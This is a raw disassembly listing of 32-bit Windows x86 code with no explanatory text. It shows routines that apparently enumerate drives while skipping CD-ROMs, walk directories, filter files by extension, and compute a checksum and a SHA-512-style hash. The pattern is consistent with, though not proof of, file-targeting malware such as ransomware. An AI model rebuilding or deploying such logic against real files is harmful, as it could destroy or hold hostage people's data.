  40329f:	68 80 ec 41 00       	push   $0x41ec80
  4032a4:	c7 05 20 8d 42 00 28 	movl   $0x428d28,0x428d20
  4032ab:	8d 42 00 
  4032ae:	0f 11 05 28 8d 42 00 	movups %xmm0,0x428d28
  4032b5:	c7 05 24 8d 42 00 38 	movl   $0x428d38,0x428d24
  4032bc:	8d 42 00 
  4032bf:	0f 10 85 90 fb ff ff 	movups -0x470(%ebp),%xmm0
  4032c6:	0f 11 05 38 8d 42 00 	movups %xmm0,0x428d38
  4032cd:	0f 10 85 a0 fb ff ff 	movups -0x460(%ebp),%xmm0
  4032d4:	0f 11 05 48 8d 42 00 	movups %xmm0,0x428d48
  4032db:	e8 d0 03 00 00       	call   0x4036b0
  4032e0:	ff 35 20 8d 42 00    	push   0x428d20
  4032e6:	68 b8 ec 41 00       	push   $0x41ecb8
  4032eb:	e8 c0 03 00 00       	call   0x4036b0
  4032f0:	83 c4 0c             	add    $0xc,%esp
  4032f3:	80 bd 7f fb ff ff 00 	cmpb   $0x0,-0x481(%ebp)
  4032fa:	0f 84 ed 01 00 00    	je     0x4034ed
  403300:	8d 85 c4 fa ff ff    	lea    -0x53c(%ebp),%eax
  403306:	50                   	push   %eax
  403307:	ff 15 40 e0 41 00    	call   *0x41e040
  40330d:	ff b5 d8 fa ff ff    	push   -0x528(%ebp)
  403313:	8d 8d e8 fa ff ff    	lea    -0x518(%ebp),%ecx
  403319:	e8 b2 df ff ff       	call   0x4012d0
  40331e:	68 00 04 00 00       	push   $0x400
  403323:	8d 85 b0 fb ff ff    	lea    -0x450(%ebp),%eax
  403329:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403330:	6a 00                	push   $0x0
  403332:	50                   	push   %eax
  403333:	e8 98 8e 00 00       	call   0x40c1d0
  403338:	83 c4 0c             	add    $0xc,%esp
  40333b:	8d 85 b0 fb ff ff    	lea    -0x450(%ebp),%eax
  403341:	50                   	push   %eax
  403342:	68 ff 01 00 00       	push   $0x1ff
  403347:	ff 15 24 e0 41 00    	call   *0x41e024
  40334d:	85 c0                	test   %eax,%eax
  40334f:	0f 84 6d 01 00 00    	je     0x4034c2
  403355:	66 83 bd b0 fb ff ff 	cmpw   $0x0,-0x450(%ebp)
  40335c:	00 
  40335d:	8d b5 b0 fb ff ff    	lea    -0x450(%ebp),%esi
  403363:	0f 84 59 01 00 00    	je     0x4034c2
  403369:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403370:	56                   	push   %esi
  403371:	ff 15 18 e0 41 00    	call   *0x41e018
  403377:	83 f8 05             	cmp    $0x5,%eax
  40337a:	0f 84 1f 01 00 00    	je     0x40349f
  403380:	6a 08                	push   $0x8
  403382:	e8 32 71 00 00       	call   0x40a4b9
  403387:	83 c4 04             	add    $0x4,%esp
  40338a:	89 85 6c fb ff ff    	mov    %eax,-0x494(%ebp)
  403390:	56                   	push   %esi
  403391:	50                   	push   %eax
  403392:	ff 15 50 e0 41 00    	call   *0x41e050
  403398:	8d 85 08 fb ff ff    	lea    -0x4f8(%ebp),%eax
  40339e:	c6 85 68 fb ff ff 00 	movb   $0x0,-0x498(%ebp)
  4033a5:	50                   	push   %eax
  4033a6:	89 85 64 fb ff ff    	mov    %eax,-0x49c(%ebp)
  4033ac:	e8 52 66 00 00       	call   0x409a03
  4033b1:	83 c4 04             	add    $0x4,%esp
  4033b4:	85 c0                	test   %eax,%eax
  4033b6:	0f 85 da 02 00 00    	jne    0x403696
  4033bc:	81 bd 34 fb ff ff ff 	cmpl   $0x7fffffff,-0x4cc(%ebp)
  4033c3:	ff ff 7f 
  4033c6:	0f 84 b9 02 00 00    	je     0x403685
  4033cc:	c6 85 68 fb ff ff 01 	movb   $0x1,-0x498(%ebp)
  4033d3:	8b bd 04 fb ff ff    	mov    -0x4fc(%ebp),%edi
  4033d9:	8b 95 fc fa ff ff    	mov    -0x504(%ebp),%edx
  4033df:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4033e3:	8d 47 01             	lea    0x1(%edi),%eax
  4033e6:	3b d0                	cmp    %eax,%edx
  4033e8:	77 19                	ja     0x403403
  4033ea:	6a 01                	push   $0x1
  4033ec:	8d 8d f4 fa ff ff    	lea    -0x50c(%ebp),%ecx
  4033f2:	e8 19 e7 ff ff       	call   0x401b10
  4033f7:	8b bd 04 fb ff ff    	mov    -0x4fc(%ebp),%edi
  4033fd:	8b 95 fc fa ff ff    	mov    -0x504(%ebp),%edx
  403403:	8b 8d 00 fb ff ff    	mov    -0x500(%ebp),%ecx
  403409:	8d 42 ff             	lea    -0x1(%edx),%eax
  40340c:	23 c8                	and    %eax,%ecx
  40340e:	8d 42 ff             	lea    -0x1(%edx),%eax
  403411:	89 8d 00 fb ff ff    	mov    %ecx,-0x500(%ebp)
  403417:	03 cf                	add    %edi,%ecx
  403419:	23 c1                	and    %ecx,%eax
  40341b:	89 8d 70 fb ff ff    	mov    %ecx,-0x490(%ebp)
  403421:	8b 8d f8 fa ff ff    	mov    -0x508(%ebp),%ecx
  403427:	8d 3c 85 00 00 00 00 	lea    0x0(,%eax,4),%edi
  40342e:	83 3c 0f 00          	cmpl   $0x0,(%edi,%ecx,1)
  403432:	75 1f                	jne    0x403453
  403434:	6a 28                	push   $0x28
  403436:	e8 40 70 00 00       	call   0x40a47b
  40343b:	8b 8d f8 fa ff ff    	mov    -0x508(%ebp),%ecx
  403441:	83 c4 04             	add    $0x4,%esp
  403444:	89 04 39             	mov    %eax,(%ecx,%edi,1)
  403447:	8b 95 fc fa ff ff    	mov    -0x504(%ebp),%edx
  40344d:	8b 8d f8 fa ff ff    	mov    -0x508(%ebp),%ecx
  403453:	8d 42 ff             	lea    -0x1(%edx),%eax
  403456:	c6 45 fc 00          	movb   $0x0,-0x4(%ebp)
  40345a:	23 85 70 fb ff ff    	and    -0x490(%ebp),%eax
  403460:	8b 04 81             	mov    (%ecx,%eax,4),%eax
  403463:	8b 8d 6c fb ff ff    	mov    -0x494(%ebp),%ecx
  403469:	89 48 04             	mov    %ecx,0x4(%eax)
  40346c:	8d 8d e8 fa ff ff    	lea    -0x518(%ebp),%ecx
  403472:	c7 00 40 ee 41 00    	movl   $0x41ee40,(%eax)
  403478:	89 48 08             	mov    %ecx,0x8(%eax)
  40347b:	89 40 24             	mov    %eax,0x24(%eax)
  40347e:	8d 85 08 fb ff ff    	lea    -0x4f8(%ebp),%eax
  403484:	ff 85 04 fb ff ff    	incl   -0x4fc(%ebp)
  40348a:	50                   	push   %eax
  40348b:	e8 84 65 00 00       	call   0x409a14
  403490:	8d 85 38 fb ff ff    	lea    -0x4c8(%ebp),%eax
  403496:	50                   	push   %eax
  403497:	e8 f7 66 00 00       	call   0x409b93
  40349c:	83 c4 08             	add    $0x8,%esp
  40349f:	8b ce                	mov    %esi,%ecx
  4034a1:	8d 51 02             	lea    0x2(%ecx),%edx
  4034a4:	66 8b 01             	mov    (%ecx),%ax
  4034a7:	83 c1 02             	add    $0x2,%ecx
  4034aa:	66 85 c0             	test   %ax,%ax
  4034ad:	75 f5                	jne    0x4034a4
  4034af:	2b ca                	sub    %edx,%ecx
  4034b1:	d1 f9                	sar    $1,%ecx
  4034b3:	8d 34 4e             	lea    (%esi,%ecx,2),%esi
  4034b6:	83 c6 02             	add    $0x2,%esi
  4034b9:	66 39 06             	cmp    %ax,(%esi)
  4034bc:	0f 85 ae fe ff ff    	jne    0x403370
  4034c2:	8d 8d e8 fa ff ff    	lea    -0x518(%ebp),%ecx
  4034c8:	e8 23 f9 ff ff       	call   0x402df0
  4034cd:	8d 8d e8 fa ff ff    	lea    -0x518(%ebp),%ecx
  4034d3:	e8 08 e2 ff ff       	call   0x4016e0
  4034d8:	b8 e8 ec 41 00       	mov    $0x41ece8,%eax
  4034dd:	50                   	push   %eax
  4034de:	e8 cd 01 00 00       	call   0x4036b0
  4034e3:	83 c4 04             	add    $0x4,%esp
  4034e6:	33 c0                	xor    %eax,%eax
  4034e8:	e9 31 fd ff ff       	jmp    0x40321e
  4034ed:	8b b5 68 fb ff ff    	mov    -0x498(%ebp),%esi
  4034f3:	85 f6                	test   %esi,%esi
  4034f5:	0f 84 73 01 00 00    	je     0x40366e
  4034fb:	8b 3d 1c e0 41 00    	mov    0x41e01c,%edi
  403501:	56                   	push   %esi
  403502:	ff d7                	call   *%edi
  403504:	83 f8 ff             	cmp    $0xffffffff,%eax
  403507:	75 1a                	jne    0x403523
  403509:	ff 15 3c e0 41 00    	call   *0x41e03c
  40350f:	50                   	push   %eax
  403510:	56                   	push   %esi
  403511:	68 30 e7 41 00       	push   $0x41e730
  403516:	e8 95 01 00 00       	call   0x4036b0
  40351b:	83 c4 0c             	add    $0xc,%esp
  40351e:	e9 f6 fc ff ff       	jmp    0x403219
  403523:	56                   	push   %esi
  403524:	ff d7                	call   *%edi
  403526:	89 85 70 fb ff ff    	mov    %eax,-0x490(%ebp)
  40352c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40352f:	0f 84 0f 01 00 00    	je     0x403644
  403535:	8d 85 8c fb ff ff    	lea    -0x474(%ebp),%eax
  40353b:	50                   	push   %eax
  40353c:	ff 15 40 e0 41 00    	call   *0x41e040
  403542:	ff b5 a0 fb ff ff    	push   -0x460(%ebp)
  403548:	8d 8d 48 fa ff ff    	lea    -0x5b8(%ebp),%ecx
  40354e:	e8 7d dd ff ff       	call   0x4012d0
  403553:	f6 85 70 fb ff ff 10 	testb  $0x10,-0x490(%ebp)
  40355a:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  403561:	74 2b                	je     0x40358e
  403563:	8d 85 48 fa ff ff    	lea    -0x5b8(%ebp),%eax
  403569:	50                   	push   %eax
  40356a:	56                   	push   %esi
  40356b:	e8 a0 e7 ff ff       	call   0x401d10
  403570:	83 c4 08             	add    $0x8,%esp
  403573:	8d 8d 48 fa ff ff    	lea    -0x5b8(%ebp),%ecx
  403579:	e8 72 f8 ff ff       	call   0x402df0
  40357e:	8d 8d 48 fa ff ff    	lea    -0x5b8(%ebp),%ecx
  403584:	e8 57 e1 ff ff       	call   0x4016e0
  403589:	e9 cb 00 00 00       	jmp    0x403659
  40358e:	6a 2e                	push   $0x2e
  403590:	56                   	push   %esi
  403591:	e8 5b 81 00 00       	call   0x40b6f1
  403596:	8b d0                	mov    %eax,%edx
  403598:	83 c4 08             	add    $0x8,%esp
  40359b:	85 d2                	test   %edx,%edx
  40359d:	0f 84 87 00 00 00    	je     0x40362a
  4035a3:	8b 3d 20 8d 42 00    	mov    0x428d20,%edi
  4035a9:	b8 2e 00 00 00       	mov    $0x2e,%eax
  4035ae:	66 89 45 b0          	mov    %ax,-0x50(%ebp)
  4035b2:	8d 48 d3             	lea    -0x2d(%eax),%ecx
  4035b5:	8a 07                	mov    (%edi),%al
  4035b7:	84 c0                	test   %al,%al
  4035b9:	74 1a                	je     0x4035d5
  4035bb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  4035c0:	83 f9 1f             	cmp    $0x1f,%ecx
  4035c3:	7d 10                	jge    0x4035d5
  4035c5:	66 98                	cbtw
  4035c7:	66 89 44 4d b0       	mov    %ax,-0x50(%ebp,%ecx,2)
  4035cc:	41                   	inc    %ecx
  4035cd:	8a 44 0f ff          	mov    -0x1(%edi,%ecx,1),%al
  4035d1:	84 c0                	test   %al,%al
  4035d3:	75 eb                	jne    0x4035c0
  4035d5:	03 c9                	add    %ecx,%ecx
  4035d7:	83 f9 40             	cmp    $0x40,%ecx
  4035da:	0f 83 bd 00 00 00    	jae    0x40369d
  4035e0:	33 c0                	xor    %eax,%eax
  4035e2:	66 89 44 0d b0       	mov    %ax,-0x50(%ebp,%ecx,1)
  4035e7:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4035ea:	50                   	push   %eax
  4035eb:	52                   	push   %edx
  4035ec:	ff 15 4c e0 41 00    	call   *0x41e04c
  4035f2:	85 c0                	test   %eax,%eax
  4035f4:	75 16                	jne    0x40360c
  4035f6:	56                   	push   %esi
  4035f7:	e8 34 eb ff ff       	call   0x402130
  4035fc:	83 c4 04             	add    $0x4,%esp
  4035ff:	8d 8d 48 fa ff ff    	lea    -0x5b8(%ebp),%ecx
  403605:	e8 d6 e0 ff ff       	call   0x4016e0
  40360a:	eb 4d                	jmp    0x403659
  40360c:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40360f:	50                   	push   %eax
  403610:	68 80 e6 41 00       	push   $0x41e680
  403615:	e8 96 00 00 00       	call   0x4036b0
  40361a:	83 c4 08             	add    $0x8,%esp
  40361d:	8d 8d 48 fa ff ff    	lea    -0x5b8(%ebp),%ecx
  403623:	e8 b8 e0 ff ff       	call   0x4016e0
  403628:	eb 2f                	jmp    0x403659
  40362a:	68 f4 e6 41 00       	push   $0x41e6f4
  40362f:	e8 7c 00 00 00       	call   0x4036b0
  403634:	83 c4 04             	add    $0x4,%esp
  403637:	8d 8d 48 fa ff ff    	lea    -0x5b8(%ebp),%ecx
  40363d:	e8 9e e0 ff ff       	call   0x4016e0
  403642:	eb 15                	jmp    0x403659
  403644:	ff 15 3c e0 41 00    	call   *0x41e03c
  40364a:	50                   	push   %eax
  40364b:	56                   	push   %esi
  40364c:	68 30 e7 41 00       	push   $0x41e730
  403651:	e8 5a 00 00 00       	call   0x4036b0
  403656:	83 c4 0c             	add    $0xc,%esp
  403659:	b8 38 ed 41 00       	mov    $0x41ed38,%eax
  40365e:	50                   	push   %eax
  40365f:	e8 4c 00 00 00       	call   0x4036b0
  403664:	83 c4 04             	add    $0x4,%esp
  403667:	33 c0                	xor    %eax,%eax
  403669:	e9 b0 fb ff ff       	jmp    0x40321e
  40366e:	68 78 ed 41 00       	push   $0x41ed78
  403673:	e8 38 00 00 00       	call   0x4036b0
  403678:	83 c4 04             	add    $0x4,%esp
  40367b:	e8 00 f7 ff ff       	call   0x402d80
  403680:	e9 94 fb ff ff       	jmp    0x403219
  403685:	6a 06                	push   $0x6
  403687:	c7 85 34 fb ff ff fe 	movl   $0x7ffffffe,-0x4cc(%ebp)
  40368e:	ff ff 7f 
  403691:	e8 ab 6b 00 00       	call   0x40a241
  403696:	6a 05                	push   $0x5
  403698:	e8 a4 6b 00 00       	call   0x40a241
  40369d:	e8 48 6f 00 00       	call   0x40a5ea
  4036a2:	cc                   	int3
  4036a3:	cc                   	int3
  4036a4:	cc                   	int3
  4036a5:	cc                   	int3
  4036a6:	cc                   	int3
  4036a7:	cc                   	int3
  4036a8:	cc                   	int3
  4036a9:	cc                   	int3
  4036aa:	cc                   	int3
  4036ab:	cc                   	int3
  4036ac:	cc                   	int3
  4036ad:	cc                   	int3
  4036ae:	cc                   	int3
  4036af:	cc                   	int3
  4036b0:	56                   	push   %esi
  4036b1:	8b 74 24 08          	mov    0x8(%esp),%esi
  4036b5:	6a 01                	push   $0x1
  4036b7:	e8 73 a9 00 00       	call   0x40e02f
  4036bc:	83 c4 04             	add    $0x4,%esp
  4036bf:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4036c3:	51                   	push   %ecx
  4036c4:	6a 00                	push   $0x0
  4036c6:	56                   	push   %esi
  4036c7:	50                   	push   %eax
  4036c8:	e8 33 f9 ff ff       	call   0x403000
  4036cd:	ff 70 04             	push   0x4(%eax)
  4036d0:	ff 30                	push   (%eax)
  4036d2:	e8 cf cb 00 00       	call   0x4102a6
  4036d7:	83 c4 18             	add    $0x18,%esp
  4036da:	5e                   	pop    %esi
  4036db:	c3                   	ret
  4036dc:	cc                   	int3
  4036dd:	cc                   	int3
  4036de:	cc                   	int3
  4036df:	cc                   	int3
  4036e0:	56                   	push   %esi
  4036e1:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4036e5:	b8 64 6f 6e 67       	mov    $0x676e6f64,%eax
  4036ea:	85 f6                	test   %esi,%esi
  4036ec:	74 22                	je     0x403710
  4036ee:	57                   	push   %edi
  4036ef:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4036f3:	0f b6 0f             	movzbl (%edi),%ecx
  4036f6:	8d 7f 01             	lea    0x1(%edi),%edi
  4036f9:	8b d0                	mov    %eax,%edx
  4036fb:	c1 e0 08             	shl    $0x8,%eax
  4036fe:	c1 ea 18             	shr    $0x18,%edx
  403701:	33 d1                	xor    %ecx,%edx
  403703:	33 04 95 58 ee 41 00 	xor    0x41ee58(,%edx,4),%eax
  40370a:	83 ee 01             	sub    $0x1,%esi
  40370d:	75 e4                	jne    0x4036f3
  40370f:	5f                   	pop    %edi
  403710:	5e                   	pop    %esi
  403711:	c3                   	ret
  403712:	cc                   	int3
  403713:	cc                   	int3
  403714:	cc                   	int3
  403715:	cc                   	int3
  403716:	cc                   	int3
  403717:	cc                   	int3
  403718:	cc                   	int3
  403719:	cc                   	int3
  40371a:	cc                   	int3
  40371b:	cc                   	int3
  40371c:	cc                   	int3
  40371d:	cc                   	int3
  40371e:	cc                   	int3
  40371f:	cc                   	int3
  403720:	81 ec a4 03 00 00    	sub    $0x3a4,%esp
  403726:	a1 80 80 42 00       	mov    0x428080,%eax
  40372b:	33 c4                	xor    %esp,%eax
  40372d:	89 84 24 a0 03 00 00 	mov    %eax,0x3a0(%esp)
  403734:	8b 8c 24 a8 03 00 00 	mov    0x3a8(%esp),%ecx
  40373b:	8d 84 24 90 01 00 00 	lea    0x190(%esp),%eax
  403742:	53                   	push   %ebx
  403743:	55                   	push   %ebp
  403744:	56                   	push   %esi
  403745:	8b b4 24 b8 03 00 00 	mov    0x3b8(%esp),%esi
  40374c:	57                   	push   %edi
  40374d:	89 8c 24 18 01 00 00 	mov    %ecx,0x118(%esp)
  403754:	8d bc 24 30 01 00 00 	lea    0x130(%esp),%edi
  40375b:	b9 20 00 00 00       	mov    $0x20,%ecx
  403760:	c7 44 24 70 40 00 00 	movl   $0x40,0x70(%esp)
  403767:	00 
  403768:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40376a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  403770:	8b 58 9c             	mov    -0x64(%eax),%ebx
  403773:	8b cb                	mov    %ebx,%ecx
  403775:	8b 68 98             	mov    -0x68(%eax),%ebp
  403778:	8b f5                	mov    %ebp,%esi
  40377a:	c1 e9 08             	shr    $0x8,%ecx
  40377d:	8b d5                	mov    %ebp,%edx
  40377f:	8b 78 04             	mov    0x4(%eax),%edi
  403782:	c1 e2 19             	shl    $0x19,%edx
  403785:	c1 e6 18             	shl    $0x18,%esi
  403788:	0b f1                	or     %ecx,%esi
  40378a:	89 5c 24 38          	mov    %ebx,0x38(%esp)
  40378e:	8b cb                	mov    %ebx,%ecx
  403790:	89 7c 24 24          	mov    %edi,0x24(%esp)
  403794:	c1 e9 07             	shr    $0x7,%ecx
  403797:	0b d1                	or     %ecx,%edx
  403799:	8b cb                	mov    %ebx,%ecx
  40379b:	33 f2                	xor    %edx,%esi
  40379d:	8b 18                	mov    (%eax),%ebx
  40379f:	d1 e9                	shr    $1,%ecx
  4037a1:	8b d5                	mov    %ebp,%edx
  4037a3:	c1 e2 1f             	shl    $0x1f,%edx
  4037a6:	0b d1                	or     %ecx,%edx
  4037a8:	8b 68 dc             	mov    -0x24(%eax),%ebp
  4037ab:	33 f2                	xor    %edx,%esi
  4037ad:	8b cb                	mov    %ebx,%ecx
  4037af:	c1 e9 1d             	shr    $0x1d,%ecx
  4037b2:	8b d7                	mov    %edi,%edx
  4037b4:	c1 ea 06             	shr    $0x6,%edx
  4037b7:	89 74 24 64          	mov    %esi,0x64(%esp)
  4037bb:	8d 34 fd 00 00 00 00 	lea    0x0(,%edi,8),%esi
  4037c2:	0b f1                	or     %ecx,%esi
  4037c4:	8b cb                	mov    %ebx,%ecx
  4037c6:	c1 e1 1a             	shl    $0x1a,%ecx
  4037c9:	0b d1                	or     %ecx,%edx
  4037cb:	8b cb                	mov    %ebx,%ecx
  4037cd:	33 f2                	xor    %edx,%esi
  4037cf:	c1 e1 0d             	shl    $0xd,%ecx
  4037d2:	8b d7                	mov    %edi,%edx
  4037d4:	8b 58 94             	mov    -0x6c(%eax),%ebx
  4037d7:	c1 ea 13             	shr    $0x13,%edx
  4037da:	0b d1                	or     %ecx,%edx
  4037dc:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  4037e0:	c1 64 24 38 18       	shll   $0x18,0x38(%esp)
  4037e5:	33 f2                	xor    %edx,%esi
  4037e7:	8b 50 98             	mov    -0x68(%eax),%edx
  4037ea:	c1 e1 1f             	shl    $0x1f,%ecx
  4037ed:	d1 ea                	shr    $1,%edx
  4037ef:	0b d1                	or     %ecx,%edx
  4037f1:	03 74 24 64          	add    0x64(%esp),%esi
  4037f5:	8b 48 98             	mov    -0x68(%eax),%ecx
  4037f8:	03 ee                	add    %esi,%ebp
  4037fa:	c1 e9 08             	shr    $0x8,%ecx
  4037fd:	0b 4c 24 38          	or     0x38(%esp),%ecx
  403801:	33 d1                	xor    %ecx,%edx
  403803:	8b 48 98             	mov    -0x68(%eax),%ecx
  403806:	c1 e9 07             	shr    $0x7,%ecx
  403809:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  40380c:	33 d1                	xor    %ecx,%edx
  40380e:	89 78 14             	mov    %edi,0x14(%eax)
  403811:	8b 08                	mov    (%eax),%ecx
  403813:	89 54 24 68          	mov    %edx,0x68(%esp)
  403817:	8b 54 24 24          	mov    0x24(%esp),%edx
  40381b:	c1 6c 24 24 1d       	shrl   $0x1d,0x24(%esp)
  403820:	c1 e9 13             	shr    $0x13,%ecx
  403823:	c1 e2 0d             	shl    $0xd,%edx
  403826:	0b d1                	or     %ecx,%edx
  403828:	8b 08                	mov    (%eax),%ecx
  40382a:	c1 e1 03             	shl    $0x3,%ecx
  40382d:	09 4c 24 24          	or     %ecx,0x24(%esp)
  403831:	33 54 24 24          	xor    0x24(%esp),%edx
  403835:	8b 08                	mov    (%eax),%ecx
  403837:	c1 e9 06             	shr    $0x6,%ecx
  40383a:	33 d1                	xor    %ecx,%edx
  40383c:	01 54 24 68          	add    %edx,0x68(%esp)
  403840:	3b 74 24 64          	cmp    0x64(%esp),%esi
  403844:	8b 54 24 68          	mov    0x68(%esp),%edx
  403848:	1b c9                	sbb    %ecx,%ecx
  40384a:	f7 d9                	neg    %ecx
  40384c:	03 d1                	add    %ecx,%edx
  40384e:	3b fb                	cmp    %ebx,%edi
  403850:	1b c9                	sbb    %ecx,%ecx
  403852:	f7 d9                	neg    %ecx
  403854:	8d 40 08             	lea    0x8(%eax),%eax
  403857:	03 d1                	add    %ecx,%edx
  403859:	3b 68 d4             	cmp    -0x2c(%eax),%ebp
  40385c:	1b c9                	sbb    %ecx,%ecx
  40385e:	f7 d9                	neg    %ecx
  403860:	03 d1                	add    %ecx,%edx
  403862:	03 50 88             	add    -0x78(%eax),%edx
  403865:	03 50 d0             	add    -0x30(%eax),%edx
  403868:	83 6c 24 70 01       	subl   $0x1,0x70(%esp)
  40386d:	89 50 08             	mov    %edx,0x8(%eax)
  403870:	0f 85 fa fe ff ff    	jne    0x403770
  403876:	8b 84 24 18 01 00 00 	mov    0x118(%esp),%eax
  40387d:	8b 08                	mov    (%eax),%ecx
  40387f:	8b 50 04             	mov    0x4(%eax),%edx
  403882:	8b 78 28             	mov    0x28(%eax),%edi
  403885:	8b 68 08             	mov    0x8(%eax),%ebp
  403888:	8b 70 10             	mov    0x10(%eax),%esi
  40388b:	8b 58 18             	mov    0x18(%eax),%ebx
  40388e:	89 7c 24 6c          	mov    %edi,0x6c(%esp)
  403892:	8b 78 2c             	mov    0x2c(%eax),%edi
  403895:	89 7c 24 1c          	mov    %edi,0x1c(%esp)
  403899:	8b 78 30             	mov    0x30(%eax),%edi
  40389c:	89 94 24 2c 01 00 00 	mov    %edx,0x12c(%esp)
  4038a3:	89 54 24 34          	mov    %edx,0x34(%esp)
  4038a7:	8b 50 0c             	mov    0xc(%eax),%edx
  4038aa:	89 7c 24 7c          	mov    %edi,0x7c(%esp)
  4038ae:	8b 78 34             	mov    0x34(%eax),%edi
  4038b1:	89 94 24 24 01 00 00 	mov    %edx,0x124(%esp)
  4038b8:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4038bc:	8b 50 14             	mov    0x14(%eax),%edx
  4038bf:	89 8c 24 94 00 00 00 	mov    %ecx,0x94(%esp)
  4038c6:	89 8c 24 94 00 00 00 	mov    %ecx,0x94(%esp)
  4038cd:	89 7c 24 50          	mov    %edi,0x50(%esp)
  4038d1:	8b 78 38             	mov    0x38(%eax),%edi
  4038d4:	89 ac 24 94 00 00 00 	mov    %ebp,0x94(%esp)
  4038db:	89 94 24 28 01 00 00 	mov    %edx,0x128(%esp)
  4038e2:	89 54 24 44          	mov    %edx,0x44(%esp)
  4038e6:	8b 50 1c             	mov    0x1c(%eax),%edx
  4038e9:	89 ac 24 94 00 00 00 	mov    %ebp,0x94(%esp)
  4038f0:	89 b4 24 94 00 00 00 	mov    %esi,0x94(%esp)
  4038f7:	89 5c 24 74          	mov    %ebx,0x74(%esp)
  4038fb:	89 94 24 94 00 00 00 	mov    %edx,0x94(%esp)
  403902:	89 5c 24 5c          	mov    %ebx,0x5c(%esp)
  403906:	8b 58 20             	mov    0x20(%eax),%ebx
  403909:	89 54 24 48          	mov    %edx,0x48(%esp)
  40390d:	8b 50 24             	mov    0x24(%eax),%edx
  403910:	8b 40 3c             	mov    0x3c(%eax),%eax
  403913:	89 7c 24 78          	mov    %edi,0x78(%esp)
  403917:	89 44 24 64          	mov    %eax,0x64(%esp)
  40391b:	8b f8                	mov    %eax,%edi
  40391d:	8b 44 24 7c          	mov    0x7c(%esp),%eax
  403921:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403925:	89 bc 24 b0 00 00 00 	mov    %edi,0xb0(%esp)
  40392c:	8b 7c 24 78          	mov    0x78(%esp),%edi
  403930:	89 7c 24 30          	mov    %edi,0x30(%esp)
  403934:	8b 7c 24 74          	mov    0x74(%esp),%edi
  403938:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  40393c:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  403940:	89 7c 24 4c          	mov    %edi,0x4c(%esp)
  403944:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  403948:	89 5c 24 68          	mov    %ebx,0x68(%esp)
  40394c:	89 9c 24 80 00 00 00 	mov    %ebx,0x80(%esp)
  403953:	89 94 24 b4 00 00 00 	mov    %edx,0xb4(%esp)
  40395a:	89 9c 24 f0 00 00 00 	mov    %ebx,0xf0(%esp)
  403961:	89 94 24 14 01 00 00 	mov    %edx,0x114(%esp)
  403968:	89 9c 24 84 00 00 00 	mov    %ebx,0x84(%esp)
  40396f:	89 94 24 1c 01 00 00 	mov    %edx,0x11c(%esp)
  403976:	89 9c 24 20 01 00 00 	mov    %ebx,0x120(%esp)
  40397d:	89 94 24 9c 00 00 00 	mov    %edx,0x9c(%esp)
  403984:	89 9c 24 a0 00 00 00 	mov    %ebx,0xa0(%esp)
  40398b:	89 54 24 20          	mov    %edx,0x20(%esp)
  40398f:	89 94 24 88 00 00 00 	mov    %edx,0x88(%esp)
  403996:	89 9c 24 a4 00 00 00 	mov    %ebx,0xa4(%esp)
  40399d:	89 94 24 a8 00 00 00 	mov    %edx,0xa8(%esp)
  4039a4:	89 44 24 10          	mov    %eax,0x10(%esp)
  4039a8:	89 9c 24 ac 00 00 00 	mov    %ebx,0xac(%esp)
  4039af:	89 4c 24 70          	mov    %ecx,0x70(%esp)
  4039b3:	89 4c 24 24          	mov    %ecx,0x24(%esp)
  4039b7:	89 8c 24 90 00 00 00 	mov    %ecx,0x90(%esp)
  4039be:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  4039c2:	89 8c 24 8c 00 00 00 	mov    %ecx,0x8c(%esp)
  4039c9:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4039cd:	89 6c 24 40          	mov    %ebp,0x40(%esp)
  4039d1:	89 8c 24 b8 00 00 00 	mov    %ecx,0xb8(%esp)
  4039d8:	89 74 24 28          	mov    %esi,0x28(%esp)
  4039dc:	89 8c 24 bc 00 00 00 	mov    %ecx,0xbc(%esp)
  4039e3:	89 b4 24 c0 00 00 00 	mov    %esi,0xc0(%esp)
  4039ea:	89 6c 24 54          	mov    %ebp,0x54(%esp)
  4039ee:	89 bc 24 c4 00 00 00 	mov    %edi,0xc4(%esp)
  4039f5:	89 84 24 c8 00 00 00 	mov    %eax,0xc8(%esp)
  4039fc:	89 94 24 cc 00 00 00 	mov    %edx,0xcc(%esp)
  403a03:	89 9c 24 d0 00 00 00 	mov    %ebx,0xd0(%esp)
  403a0a:	8b 44 24 50          	mov    0x50(%esp),%eax
  403a0e:	89 84 24 d4 00 00 00 	mov    %eax,0xd4(%esp)
  403a15:	89 84 24 d8 00 00 00 	mov    %eax,0xd8(%esp)
  403a1c:	8b 44 24 7c          	mov    0x7c(%esp),%eax
  403a20:	89 44 24 7c          	mov    %eax,0x7c(%esp)
  403a24:	8b 44 24 6c          	mov    0x6c(%esp),%eax
  403a28:	89 ac 24 e0 00 00 00 	mov    %ebp,0xe0(%esp)
  403a2f:	89 b4 24 e4 00 00 00 	mov    %esi,0xe4(%esp)
  403a36:	8b f7                	mov    %edi,%esi
  403a38:	89 9c 24 ec 00 00 00 	mov    %ebx,0xec(%esp)
  403a3f:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  403a43:	8b 44 24 68          	mov    0x68(%esp),%eax
  403a47:	89 ac 24 fc 00 00 00 	mov    %ebp,0xfc(%esp)
  403a4e:	89 9c 24 08 01 00 00 	mov    %ebx,0x108(%esp)
  403a55:	8b 5c 24 50          	mov    0x50(%esp),%ebx
  403a59:	89 6c 24 74          	mov    %ebp,0x74(%esp)
